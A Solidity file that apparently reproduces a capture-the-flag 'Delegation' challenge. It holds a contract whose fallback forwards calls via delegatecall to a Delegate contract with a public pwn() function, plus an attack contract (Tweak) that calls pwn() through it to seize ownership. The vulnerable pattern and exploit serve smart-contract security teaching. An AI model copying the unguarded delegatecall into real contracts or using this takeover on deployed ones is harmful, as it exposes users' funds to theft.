// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result, ) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}

contract Tweak {
    address public delcontract;
    Delegation delegation;

    constructor(address _delegationAddress) {
        delegation = Delegation(_delegationAddress);
        delcontract = _delegationAddress;
    }
    
    // trigger callback with msg.data
    function tweak() public {
        (bool success, ) = address(delcontract).call(abi.encodeWithSignature("pwn()")); 
    }
}